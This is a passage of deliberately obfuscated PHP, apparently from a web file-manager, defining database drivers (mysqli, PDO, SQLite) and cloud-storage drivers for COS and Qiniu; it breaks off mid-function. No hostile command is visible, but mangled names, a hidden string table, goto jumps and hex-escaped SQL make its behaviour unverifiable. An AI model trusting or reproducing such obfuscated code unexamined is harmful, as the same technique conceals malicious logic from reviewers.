$this->linkID[$—ãÛßş]->server_version; $this->linkID[$—ãÛßş]->query($ã‰ø¢ïŞ[886] . think_config($ã‰ø¢ïŞ[887]) . $ã‰ø¢ïŞ[58]); if ($Ù„ûªáù > $ã‰ø¢ïŞ[888]) { $this->linkID[$—ãÛßş]->query($ã‰ø¢ïŞ[889]); } $this->connected = !0; if (1 != think_config($ã‰ø¢ïŞ[22])) { unset($this->config); } } return $this->linkID[$—ãÛßş]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($×”•Âì‡) { $®Ôã¨Â =& $_SERVER[Ãìšã«™]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $×”•Âì‡; if ($this->queryID) { $this->free(); } think_action_status($®Ôã¨Â[23], 1); think_status($®Ôã¨Â[24]); $this->queryID = $this->_linkID->query($×”•Âì‡); if ($this->_linkID->more_results()) { while (($€”º¥–ø = $this->_linkID->next_result()) != NULL) { $€”º¥–ø->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($ÚœÑâ”ã) { $Âòàßã½ =& $_SERVER[Ãìšã«™]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ÚœÑâ”ã; if ($this->queryID) { $this->free(); } think_action_status($Âòàßã½[25], 1); think_status($Âòàßã½[24]); $Ğã†·Å  = $this->_linkID->query($ÚœÑâ”ã); $this->debug(); if (!1 === $Ğã†·Å ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $–‰´Æš“ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$–‰´Æš“) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $¯¬Ê¼¡š = $this->_linkID->rollback(); $this->transTimes = 0; if (!$¯¬Ê¼¡š) { $this->error(); return !1; } } return !0; } private function getAll() { $¼êŞ¸è = array(); if ($this->numRows > 0) { for ($ûù†ı“§ = 0; $ûù†ı“§ < $this->numRows; $ûù†ı“§++) { $¼êŞ¸è[$ûù†ı“§] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $¼êŞ¸è; } public function getFields($èé¡û) { $›üš©ÔÖ =& $_SERVER[Ãìšã«™]; $®ËÇÚüÚ = $this->query($›üš©ÔÖ[893] . $this->parseKey($èé¡û)); $¡ñ²Ë°È = array(); if ($®ËÇÚüÚ) { foreach ($®ËÇÚüÚ as $ íÔÈ¯Ì => $·‡à¨¶Ü) { $¡ñ²Ë°È[$·‡à¨¶Ü[$›üš©ÔÖ[31]]] = array($›üš©ÔÖ[32] => $·‡à¨¶Ü[$›üš©ÔÖ[31]], $›üš©ÔÖ[33] => $·‡à¨¶Ü[$›üš©ÔÖ[34]], $›üš©ÔÖ[35] => (bool) ($·‡à¨¶Ü[$›üš©ÔÖ[36]] === $›üš©ÔÖ[12]), $›üš©ÔÖ[37] => $·‡à¨¶Ü[$›üš©ÔÖ[38]], $›üš©ÔÖ[39] => strtolower($·‡à¨¶Ü[$›üš©ÔÖ[40]]) == $›üš©ÔÖ[41], $›üš©ÔÖ[42] => strtolower($·‡à¨¶Ü[$›üš©ÔÖ[43]]) == $›üš©ÔÖ[44]); } } return $¡ñ²Ë°È; } public function getTables($Ë—Öè±ê = '') { $‹Ã·‰ =& $_SERVER[Ãìšã«™]; $ÏÅÌÚ› = !empty($Ë—Öè±ê) ? $‹Ã·‰[895] . $Ë—Öè±ê . $‹Ã·‰[896] : $‹Ã·‰[897]; $©÷ˆ¼àˆ = $this->query($ÏÅÌÚ›); $Â‚£Í‚ = array(); if ($©÷ˆ¼àˆ) { foreach ($©÷ˆ¼àˆ as $ÜÄ‡Šœò => $àÈ¥¦™Ñ) { $Â‚£Í‚[$ÜÄ‡Šœò] = current($àÈ¥¦™Ñ); } } return $Â‚£Í‚; } public function replace($Êµ€É£æ, $ãÖİƒûÙ = array()) { $É¼»Ì®ì =& $_SERVER[Ãìšã«™]; foreach ($Êµ€É£æ as $üÜüøùî => $—æğß½ğ) { $äÄÃõßÁ = $this->parseValue($—æğß½ğ); if (is_scalar($äÄÃõßÁ)) { $²‰õ¡˜[] = $äÄÃõßÁ; $ÌÇöŒøº[] = $this->parseKey($üÜüøùî); } } $…õúØŒí = $É¼»Ì®ì[898] . $this->parseTable($ãÖİƒûÙ[$É¼»Ì®ì[274]]) . $É¼»Ì®ì[899] . implode($É¼»Ì®ì[50], $ÌÇöŒøº) . $É¼»Ì®ì[900] . implode($É¼»Ì®ì[50], $²‰õ¡˜) . $É¼»Ì®ì[901]; return $this->execute($…õúØŒí); } public function insertAll($—«äğÁ, $©òıˆ¢ = array(), $®°“€¿Ì = false) { $®îß¸É² =& $_SERVER[Ãìšã«™]; if (!is_array($—«äğÁ[0])) { return !1; } $’ÌÖ„ºÉ = array_keys($—«äğÁ[0]); $Ã¨…‰« = array(); foreach ($—«äğÁ as $Ş±òÇÔ©) { $¿¥¦Ò”¹ = array(); foreach ($Ş±òÇÔ© as $£Ğº÷…È => $¾£™ßÊá) { $¾£™ßÊá = $this->parseValue($¾£™ßÊá); if (is_scalar($¾£™ßÊá)) { $¿¥¦Ò”¹[] = $¾£™ßÊá; } } $Ã¨…‰«[] = $®îß¸É²[255] . implode($®îß¸É²[50], $¿¥¦Ò”¹) . $®îß¸É²[901]; } array_walk($’ÌÖ„ºÉ, array($this, $®îß¸É²[902])); $æ“Û¿ºœ = $®°“€¿Ì ? $®îß¸É²[903] : $®îß¸É²[904]; $­ÊõÍ  = $æ“Û¿ºœ . $®îß¸É²[905] . $this->parseTable($©òıˆ¢[$®îß¸É²[274]]) . $®îß¸É²[899] . implode($®îß¸É²[50], $’ÌÖ„ºÉ) . $®îß¸É²[906] . implode($®îß¸É²[50], $Ã¨…‰«); return $this->execute($­ÊõÍ ); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $î¬Ä‘ßÖ =& $_SERVER[Ãìšã«™]; $this->error = $this->_linkID->errno . $î¬Ä‘ßÖ[4] . $this->_linkID->error; if ($î¬Ä‘ßÖ[12] != $this->queryStr) { $this->error .= LNG($î¬Ä‘ßÖ[48]) . $this->queryStr; } think_trace($this->error, $î¬Ä‘ßÖ[12], $î¬Ä‘ßÖ[49]); return $this->error; } public function escapeString($ôÕˆŸŞ§) { if ($this->_linkID) { return $this->_linkID->real_escape_string($ôÕˆŸŞ§); } else { return addslashes($ôÕˆŸŞ§); } } public function parseKey(&$ó¥Ï½Ò, $‰¶­øƒ = true) { $«Ò¾ÒÈ =& $_SERVER[Ãìšã«™]; if ($‰¶­øƒ) { $ó¥Ï½Ò = $this->parseKeyCheck($ó¥Ï½Ò); } if ($ó¥Ï½Ò != $«Ò¾ÒÈ[181] && !preg_match($«Ò¾ÒÈ[907], $ó¥Ï½Ò)) { $ó¥Ï½Ò = $«Ò¾ÒÈ[380] . trim($ó¥Ï½Ò, $«Ò¾ÒÈ[380]) . $«Ò¾ÒÈ[380]; } return $ó¥Ï½Ò; } } goto fÂ¬‡°ÎƒÏ; a×ä»åàŠŞ: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($¾ù¨ÊÀ­) { parent::__construct($¾ù¨ÊÀ­); $this->signatureVersion($_SERVER[Ãìšã«™][211]); } public function uploadFormData($—²§ø‚‰, $Í°÷Ç = 3600) { $¼ì·¼Ïæ =& $_SERVER[Ãìšã«™]; $ï‹Š£” = $¼ì·¼Ïæ[191]; $‚§±÷¶ä = $¼ì·¼Ïæ[227]; $Ô¯¼”Ã¨ = $¼ì·¼Ïæ[1304]; $¡Ğ»ºµ‡ = gmdate($¼ì·¼Ïæ[1305], time() + $Í°÷Ç); $£ÍÛø˜‘ = (string) time() . $¼ì·¼Ïæ[71] . (string) (time() + $Í°÷Ç); $Ó¸‘øÒ‹ = array($¼ì·¼Ïæ[1306] => $¡Ğ»ºµ‡, $¼ì·¼Ïæ[1307] => array(array($¼ì·¼Ïæ[1308] => $ï‹Š£”), array($¼ì·¼Ïæ[1309] => $this->bucket), array($¼ì·¼Ïæ[1310], $¼ì·¼Ïæ[1311], $¼ì·¼Ïæ[12]), array($¼ì·¼Ïæ[1312] => $Ô¯¼”Ã¨), array($¼ì·¼Ïæ[1313] => $‚§±÷¶ä), array($¼ì·¼Ïæ[1314] => $this->accessKey), array($¼ì·¼Ïæ[1315] => $£ÍÛø˜‘))); $Ó¸‘øÒ‹ = json_encode($Ó¸‘øÒ‹); $×½æ×Åâ = hash_hmac($¼ì·¼Ïæ[227], $£ÍÛø˜‘, $this->secret); $¨Ç¶¼‹ = sha1($Ó¸‘øÒ‹); $ƒ°Ûê°× = hash_hmac($¼ì·¼Ïæ[227], $¨Ç¶¼‹, $×½æ×Åâ); $§‚üØÆ = array($¼ì·¼Ïæ[1308] => $ï‹Š£”, $¼ì·¼Ïæ[1312] => $Ô¯¼”Ã¨, $¼ì·¼Ïæ[1316] => base64_encode($Ó¸‘øÒ‹), $¼ì·¼Ïæ[1313] => $‚§±÷¶ä, $¼ì·¼Ïæ[1314] => $this->accessKey, $¼ì·¼Ïæ[1317] => $£ÍÛø˜‘, $¼ì·¼Ïæ[1318] => $ƒ°Ûê°×, $¼ì·¼Ïæ[174] => $this->getHost()); return $§‚üØÆ; } public function fileOutLink($õ€îş¬Ö) { $«ÓÊ›ˆ¶ =& $_SERVER[Ãìšã«™]; if (substr($õ€îş¬Ö, 0, 7) == $«ÓÊ›ˆ¶[1319]) { $õ€îş¬Ö = $«ÓÊ›ˆ¶[1320] . substr($õ€îş¬Ö, 7); } header($«ÓÊ›ˆ¶[158] . $õ€îş¬Ö); die; } } $_file = $_SERVER[$_SERVER[Ãìšã«™][393]]; $_size = $_SERVER[Ãìšã«™][394]; goto E³»‚óİÅ; fÂ¬‡°ÎƒÏ: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($ÁÌ­¶Ú¦ = '') { $ÊŒ±Íñá =& $_SERVER[Ãìšã«™]; if (!class_exists($ÊŒ±Íñá[910])) { think_exception(think_lang($ÊŒ±Íñá[14]) . $ÊŒ±Íñá[911]); } if (!empty($ÁÌ­¶Ú¦)) { $this->config = $ÁÌ­¶Ú¦; if (empty($this->config[$ÊŒ±Íñá[17]])) { $this->config[$ÊŒ±Íñá[17]] = array(); } } } public function connect($ãÓÂ…Ş¯ = '', $ØÔÙüÔ = 0) { $Šç‘„¦ =& $_SERVER[Ãìšã«™]; if (!isset($this->linkID[$ØÔÙüÔ])) { if (empty($ãÓÂ…Ş¯)) { $ãÓÂ…Ş¯ = $this->config; } $ÀŸæº˜Ğ = !empty($ãÓÂ…Ş¯[$Šç‘„¦[17]][$Šç‘„¦[18]]) ? $ãÓÂ…Ş¯[$Šç‘„¦[17]][$Šç‘„¦[18]] : $this->pconnect; if ($ÀŸæº˜Ğ) { $ãÓÂ…Ş¯[$Šç‘„¦[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$ØÔÙüÔ] = new PDO($ãÓÂ…Ş¯[$Šç‘„¦[912]], $ãÓÂ…Ş¯[$Šç‘„¦[884]], $ãÓÂ…Ş¯[$Šç‘„¦[885]], $ãÓÂ…Ş¯[$Šç‘„¦[17]]); } catch (PDOException $ùÒâÊüı) { think_exception($ùÒâÊüı->getMessage()); } $this->dbType = $this->_getDsnType($ãÓÂ…Ş¯[$Šç‘„¦[912]]); if (in_array($this->dbType, array($Šç‘„¦[913], $Šç‘„¦[914], $Šç‘„¦[915], $Šç‘„¦[916]))) { think_exception($Šç‘„¦[917] . $this->dbType . $Šç‘„¦[918] . $this->dbType . $Šç‘„¦[919]); } if (!$this->linkID[$ØÔÙüÔ]) { think_exception($Šç‘„¦[920]); } try { $this->linkID[$ØÔÙüÔ]->exec($Šç‘„¦[921] . think_config($Šç‘„¦[887])); } catch (Exception $ùÒâÊüı) { } $this->connected = !0; if (1 != think_config($Šç‘„¦[22])) { unset($this->config); } } return $this->linkID[$ØÔÙüÔ]; } public function free() { $this->PDOStatement = null; } public function query($šÛ›¿‘´, $Ÿ¨Œ·ÅÄ = array()) { $€¹è¶¼¶ =& $_SERVER[Ãìšã«™]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $šÛ›¿‘´; if (!empty($Ÿ¨Œ·ÅÄ)) { $this->queryStr .= $€¹è¶¼¶[922] . print_r($Ÿ¨Œ·ÅÄ, !0) . $€¹è¶¼¶[923]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($€¹è¶¼¶[23], 1); think_status($€¹è¶¼¶[24]); $this->PDOStatement = $this->_linkID->prepare($šÛ›¿‘´); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ô¼ÒøŸÜ = $this->PDOStatement->execute($Ÿ¨Œ·ÅÄ); $this->debug(); if (!1 === $ô¼ÒøŸÜ) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($ëĞæòŞ, $ÏÁ‹ö—Ú = array()) { $òªöƒ¦Ş =& $_SERVER[Ãìšã«™]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ëĞæòŞ; if (!empty($ÏÁ‹ö—Ú)) { $this->queryStr .= $òªöƒ¦Ş[922] . print_r($ÏÁ‹ö—Ú, !0) . $òªöƒ¦Ş[923]; } $ş·ÕØ¦¬ = !1; if ($this->dbType == $òªöƒ¦Ş[916]) { if (preg_match($òªöƒ¦Ş[924], $this->queryStr, $¬…‚Ñã²)) { $this->table = think_config($òªöƒ¦Ş[925]) . str_ireplace(think_config($òªöƒ¦Ş[926]), $òªöƒ¦Ş[373], $¬…‚Ñã²[2]); $ş·ÕØ¦¬ = (bool) $this->query($òªöƒ¦Ş[927] . strtoupper($this->table) . $òªöƒ¦Ş[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($òªöƒ¦Ş[25], 1); think_status($òªöƒ¦Ş[24]); $this->PDOStatement = $this->_linkID->prepare($ëĞæòŞ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ì´Ò–Íß = $this->PDOStatement->execute($ÏÁ‹ö—Ú); $this->debug(); if (!1 === $ì´Ò–Íß) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($ş·ÕØ¦¬ || preg_match($òªöƒ¦Ş[928], $ëĞæòŞ)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Ø¶¹¿©Ô = $this->_linkID->commit(); $this->transTimes = 0; if (!$Ø¶¹¿©Ô) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÎÈï•ÕÉ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ÎÈï•ÕÉ) { $this->error(); return !1; } } return !0; } private function getAll() { $ŸÔ²Ğäœ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($ŸÔ²Ğäœ); return $ŸÔ²Ğäœ; } public function getFields($õ˜—Ò¹‹) { $ÎÆÓ›İ‰ =& $_SERVER[Ãìšã«™]; $this->initConnect(!0); if (think_config($ÎÆÓ›İ‰[929])) { $ôëÛà‘˜ = str_replace($ÎÆÓ›İ‰[930], $õ˜—Ò¹‹, think_config($ÎÆÓ›İ‰[929])); } else { switch ($this->dbType) { case $ÎÆÓ›İ‰[913]: case $ÎÆÓ›İ‰[931]: $ôëÛà‘˜ = "\123\105\x4c\105\x43\124\40\x20\40\143\x6f\x6c\165\155\x6e\x5f\x6e\141\x6d\x65\40\141\x73\40\x27\116\141\155\145\47\x2c\40\40\x20\x64\141\164\141\137\164\171\160\x65\40\141\163\x20\47\124\x79\160\145\47\x2c\40\40\40\x63\157\154\x75\155\156\137\x64\145\x66\141\165\x6c\164\x20\141\163\x20\47\x44\145\x66\x61\165\154\164\47\54\40\40\x20\151\163\137\156\165\x6c\x6c\x61\142\154\x65\40\141\x73\40\47\116\165\154\x6c\47\xa\11\11\106\122\117\115\x9\151\x6e\x66\157\162\155\x61\164\x69\x6f\x6e\137\163\143\x68\145\x6d\141\x2e\164\x61\142\154\145\x73\x20\x41\123\x20\x74\xa\x9\11\x4a\117\x49\x4e\11\151\x6e\146\157\162\155\141\x74\x69\157\x6e\x5f\163\143\150\x65\155\x61\x2e\143\x6f\x6c\x75\155\x6e\163\x20\101\123\40\x63\xa\x9\x9\x4f\x4e\40\x20\164\56\x74\141\x62\154\145\137\143\141\164\141\x6c\x6f\147\x20\75\40\x63\x2e\x74\x61\142\154\x65\x5f\143\x61\164\141\154\157\x67\xa\x9\x9\x41\116\x44\40\x74\56\164\x61\x62\154\x65\137\163\143\150\x65\x6d\141\x20\75\40\x63\56\164\x61\x62\154\145\x5f\x73\143\x68\145\x6d\141\xa\11\11\x41\x4e\104\x20\x74\56\164\141\142\x6c\145\x5f\156\x61\x6d\145\40\x3d\x20\143\x2e\x74\141\x62\154\x65\x5f\x6e\141\x6d\x65\12\x9\11\127\110\x45\x52\x45\x20\x20\40\164\x2e\164\x61\142\154\x65\x5f\156\x61\155\145\x20\x3d\40\47{$õ˜—Ò¹‹}\47"; break; case $ÎÆÓ›İ‰[932]: $ôëÛà‘˜ = $ÎÆÓ›İ‰[933] . $õ˜—Ò¹‹ . $ÎÆÓ›İ‰[934]; break; case $ÎÆÓ›İ‰[914]: case $ÎÆÓ›İ‰[916]: $ôëÛà‘˜ = $ÎÆÓ›İ‰[935] . $ÎÆÓ›İ‰[936] . $ÎÆÓ›İ‰[937] . strtoupper($õ˜—Ò¹‹) . $ÎÆÓ›İ‰[938] . strtoupper($õ˜—Ò¹‹) . $ÎÆÓ›İ‰[939]; break; case $ÎÆÓ›İ‰[940]: $ôëÛà‘˜ = $ÎÆÓ›İ‰[941] . $õ˜—Ò¹‹ . $ÎÆÓ›İ‰[942]; break; case $ÎÆÓ›İ‰[915]: break; case $ÎÆÓ›İ‰[943]: default: $ôëÛà‘˜ = $ÎÆÓ›İ‰[944] . ($this->dbType == $ÎÆÓ›İ‰[943] ? "\x60{$õ˜—Ò¹‹}\x60" : $õ˜—Ò¹‹); } } $Ç…°ıûÅ = $this->query($ôëÛà‘˜); $œ‡³Á‘ˆ = array(); if ($Ç…°ıûÅ) { foreach ($Ç…°ıûÅ as $ÈËìÄË => $±¥åÀğ) { $±¥åÀğ = array_change_key_case($±¥åÀğ); $±¥åÀğ[$ÎÆÓ›İ‰[32]] = isset($±¥åÀğ[$ÎÆÓ›İ‰[32]]) ? $±¥åÀğ[$ÎÆÓ›İ‰[32]] : $ÎÆÓ›İ‰[373]; $±¥åÀğ[$ÎÆÓ›İ‰[33]] = isset($±¥åÀğ[$ÎÆÓ›İ‰[33]]) ? $±¥åÀğ[$ÎÆÓ›İ‰[33]] : $ÎÆÓ›İ‰[373]; $¥ƒ¥¥Æ = isset($±¥åÀğ[$ÎÆÓ›İ‰[268]]) ? $±¥åÀğ[$ÎÆÓ›İ‰[268]] : $±¥åÀğ[$ÎÆÓ›İ‰[32]]; $œ‡³Á‘ˆ[$¥ƒ¥¥Æ] = array($ÎÆÓ›İ‰[32] => $¥ƒ¥¥Æ, $ÎÆÓ›İ‰[33] => $±¥åÀğ[$ÎÆÓ›İ‰[33]], $ÎÆÓ›İ‰[35] => (bool) (isset($±¥åÀğ[$ÎÆÓ›İ‰[104]]) && $±¥åÀğ[$ÎÆÓ›İ‰[104]] === $ÎÆÓ›İ‰[12] || isset($±¥åÀğ[$ÎÆÓ›İ‰[35]]) && $±¥åÀğ[$ÎÆÓ›İ‰[35]] === $ÎÆÓ›İ‰[12]), $ÎÆÓ›İ‰[37] => isset($±¥åÀğ[$ÎÆÓ›İ‰[37]]) ? $±¥åÀğ[$ÎÆÓ›İ‰[37]] : (isset($±¥åÀğ[$ÎÆÓ›İ‰[56]]) ? $±¥åÀğ[$ÎÆÓ›İ‰[56]] : $ÎÆÓ›İ‰[373]), $ÎÆÓ›İ‰[39] => isset($±¥åÀğ[$ÎÆÓ›İ‰[95]]) ? strtolower($±¥åÀğ[$ÎÆÓ›İ‰[95]]) == $ÎÆÓ›İ‰[41] : (isset($±¥åÀğ[$ÎÆÓ›İ‰[57]]) ? $±¥åÀğ[$ÎÆÓ›İ‰[57]] : !1), $ÎÆÓ›İ‰[42] => isset($±¥åÀğ[$ÎÆÓ›İ‰[945]]) ? strtolower($±¥åÀğ[$ÎÆÓ›İ‰[945]]) == $ÎÆÓ›İ‰[44] : (isset($±¥åÀğ[$ÎÆÓ›İ‰[95]]) ? $±¥åÀğ[$ÎÆÓ›İ‰[95]] : !1)); } } return $œ‡³Á‘ˆ; } public function getTables($­‚…äÅ = '') { $ÜÄ¾„šñ =& $_SERVER[Ãìšã«™]; if (think_config($ÜÄ¾„šñ[946])) { $‹¥íÜò± = str_replace($ÜÄ¾„šñ[947], $­‚…äÅ, think_config($ÜÄ¾„šñ[946])); } else { switch ($this->dbType) { case $ÜÄ¾„šñ[914]: case $ÜÄ¾„šñ[916]: $‹¥íÜò± = $ÜÄ¾„šñ[948]; break; case $ÜÄ¾„šñ[913]: case $ÜÄ¾„šñ[931]: $‹¥íÜò± = $ÜÄ¾„šñ[949]; break; case $ÜÄ¾„šñ[940]: $‹¥íÜò± = $ÜÄ¾„šñ[950]; break; case $ÜÄ¾„šñ[915]: think_exception(think_lang($ÜÄ¾„šñ[951]) . $ÜÄ¾„šñ[952]); break; case $ÜÄ¾„šñ[932]: $‹¥íÜò± = $ÜÄ¾„šñ[45] . $ÜÄ¾„šñ[46] . $ÜÄ¾„šñ[47]; break; case $ÜÄ¾„šñ[943]: default: if (!empty($­‚…äÅ)) { $‹¥íÜò± = $ÜÄ¾„šñ[895] . $­‚…äÅ . $ÜÄ¾„šñ[896]; } else { $‹¥íÜò± = $ÜÄ¾„šñ[897]; } } } $×Å±‘Ñ = $this->query($‹¥íÜò±); $Æ¹œ˜ì” = array(); foreach ($×Å±‘Ñ as $¢°çùŠ´ => $…äãá°±) { $Æ¹œ˜ì”[$¢°çùŠ´] = current($…äãá°±); } return $Æ¹œ˜ì”; } protected function parseLimit($œ¤…™Ğò) { $İ¦êè¨‹ =& $_SERVER[Ãìšã«™]; $ƒØç¡ò• = $İ¦êè¨‹[12]; if (!empty($œ¤…™Ğò)) { switch ($this->dbType) { case $İ¦êè¨‹[940]: case $İ¦êè¨‹[932]: $œ¤…™Ğò = explode($İ¦êè¨‹[50], $œ¤…™Ğò); if (count($œ¤…™Ğò) > 1) { $ƒØç¡ò• .= $İ¦êè¨‹[51] . $œ¤…™Ğò[1] . $İ¦êè¨‹[52] . $œ¤…™Ğò[0] . $İ¦êè¨‹[53]; } else { $ƒØç¡ò• .= $İ¦êè¨‹[51] . $œ¤…™Ğò[0] . $İ¦êè¨‹[53]; } break; case $İ¦êè¨‹[913]: case $İ¦êè¨‹[931]: break; case $İ¦êè¨‹[915]: break; case $İ¦êè¨‹[914]: case $İ¦êè¨‹[916]: break; case $İ¦êè¨‹[943]: default: $ƒØç¡ò• .= $İ¦êè¨‹[51] . $œ¤…™Ğò . $İ¦êè¨‹[53]; } } return $ƒØç¡ò•; } public function parseKey(&$——Î‹Â¿, $”¼íŸ¦ô = true) { $ß”œºÃ =& $_SERVER[Ãìšã«™]; if ($”¼íŸ¦ô) { $——Î‹Â¿ = $this->parseKeyCheck($——Î‹Â¿); } if ($this->dbType == $ß”œºÃ[943]) { if ($——Î‹Â¿ != $ß”œºÃ[181] && !preg_match($ß”œºÃ[907], $——Î‹Â¿)) { $——Î‹Â¿ = $ß”œºÃ[380] . trim($——Î‹Â¿, $ß”œºÃ[380]) . $ß”œºÃ[380]; } return $——Î‹Â¿; } else { return parent::parseKey($——Î‹Â¿, $”¼íŸ¦ô); } } public function close() { $this->_linkID = null; } public function error() { $¨²œóßù =& $_SERVER[Ãìšã«™]; if ($this->PDOStatement) { $Øàå¿¦õ = $this->PDOStatement->errorInfo(); $this->error = $Øàå¿¦õ[1] . $¨²œóßù[4] . $Øàå¿¦õ[2]; } else { $this->error = $¨²œóßù[12]; } if ($¨²œóßù[12] != $this->queryStr) { $this->error .= LNG($¨²œóßù[48]) . $this->queryStr; } think_trace($this->error, $¨²œóßù[12], $¨²œóßù[49]); return $this->error; } public function escapeString($ØİÔÔáş) { $™ëóíÊÅ =& $_SERVER[Ãìšã«™]; switch ($this->dbType) { case $™ëóíÊÅ[940]: case $™ëóíÊÅ[913]: case $™ëóíÊÅ[931]: case $™ëóíÊÅ[943]: return addslashes($ØİÔÔáş); case $™ëóíÊÅ[915]: case $™ëóíÊÅ[932]: case $™ëóíÊÅ[914]: case $™ëóíÊÅ[916]: return str_ireplace($™ëóíÊÅ[58], $™ëóíÊÅ[59], $ØİÔÔáş); } } protected function parseValue($ş„ˆÑ) { $»ŠÔÕé… =& $_SERVER[Ãìšã«™]; if (is_string($ş„ˆÑ)) { $¼ú¶¼Äè = strpos($ş„ˆÑ, $»ŠÔÕé…[4]) === 0 && in_array($ş„ˆÑ, array_keys($this->bind)); $ş„ˆÑ = $¼ú¶¼Äè ? $this->escapeString($ş„ˆÑ) : $»ŠÔÕé…[953] . $this->escapeString($ş„ˆÑ) . $»ŠÔÕé…[953]; } elseif (isset($ş„ˆÑ[0]) && is_string($ş„ˆÑ[0]) && strtolower($ş„ˆÑ[0]) == $»ŠÔÕé…[292]) { $ş„ˆÑ = $this->escapeString($ş„ˆÑ[1]); } elseif (is_array($ş„ˆÑ)) { $ş„ˆÑ = array_map(array($this, $»ŠÔÕé…[954]), $ş„ˆÑ); } elseif (is_bool($ş„ˆÑ)) { $ş„ˆÑ = $ş„ˆÑ ? $»ŠÔÕé…[89] : $»ŠÔÕé…[190]; } elseif (is_null($ş„ˆÑ)) { $ş„ˆÑ = $»ŠÔÕé…[104]; } return $ş„ˆÑ; } public function getLastInsertId() { $±§àèáú =& $_SERVER[Ãìšã«™]; switch ($this->dbType) { case $±§àèáú[940]: case $±§àèáú[932]: case $±§àèáú[913]: case $±§àèáú[931]: case $±§àèáú[915]: case $±§àèáú[943]: return $this->_linkID->lastInsertId(); case $±§àèáú[914]: case $±§àèáú[916]: $œŒ¯¦ïı = $this->table; $‘öšØö = $this->query("\x53\105\x4c\105\x43\124\40{$œŒ¯¦ïı}\56\143\165\x72\x72\166\141\154\40\143\165\x72\x72\166\x61\x6c\40\x46\x52\117\x4d\x20\144\165\141\154"); return $‘öšØö ? $‘öšØö[0][$±§àèáú[955]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($³—”È„) { $¯˜ãş¤¦ =& $_SERVER[Ãìšã«™]; if (!CacheLock::fileLock($¯˜ãş¤¦[13])) { return !1; } $Ú¿®¾  = parent::query($³—”È„); CacheLock::fileUnLock($¯˜ãş¤¦[13]); return $Ú¿®¾ ; } public function execute($éµÕçÂ) { $È¬ÁÕûŠ =& $_SERVER[Ãìšã«™]; if (!CacheLock::fileLock($È¬ÁÕûŠ[13])) { return !1; } $Œî¦òŸÑ = parent::execute($éµÕçÂ); CacheLock::fileUnLock($È¬ÁÕûŠ[13]); return $Œî¦òŸÑ; } } class DbSqlite3 extends DbSqlite3Base { public function query($°³õôí—) { $Ô¢ØÌ¤® =& $_SERVER[Ãìšã«™]; if (!CacheLock::fileLock($Ô¢ØÌ¤®[13])) { return !1; } $Ú’ŞÏ× = parent::query($°³õôí—); CacheLock::fileUnLock($Ô¢ØÌ¤®[13]); return $Ú’ŞÏ×; } public function execute($™æûè°ä) { $³Ç²×³î =& $_SERVER[Ãìšã«™]; if (!CacheLock::fileLock($³Ç²×³î[13])) { return !1; } $äÀèó€ú = parent::execute($™æûè°ä); CacheLock::fileUnLock($³Ç²×³î[13]); return $äÀèó€ú; } } goto DÅ¶¶’„¯’; Bãæ‰•™«…: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public function __construct($–¾…¤) { parent::__construct(); require_once SDK_DIR . $_SERVER[Ãìšã«™][1419]; $this->_init($–¾…¤); } public function _init($“¸Í™È¾) { $˜±¹Ù–¼ =& $_SERVER[Ãìšã«™]; foreach ($“¸Í™È¾ as $çµø”ãÊ => $° ÊÜÏµ) { if (isset($this->{$çµø”ãÊ})) { $this->{$çµø”ãÊ} = $° ÊÜÏµ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($˜±¹Ù–¼[1420] . LNG($˜±¹Ù–¼[1378])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($Û‡ê§†, $Âôö´®™ = '', $˜Å˜Ã° = REPEAT_RENAME) { if ($this->setContent($Û‡ê§†, $Âôö´®™)) { return $this->getPathOuter($Û‡ê§†); } return !1; } public function mkdir($¼›’ò™–, $½ÛÊ¥àµ = REPEAT_SKIP) { $¹·¬ëÕ¤ =& $_SERVER[Ãìšã«™]; $¢¸¿š±× = trim($¼›’ò™–, $¹·¬ëÕ¤[8]); if 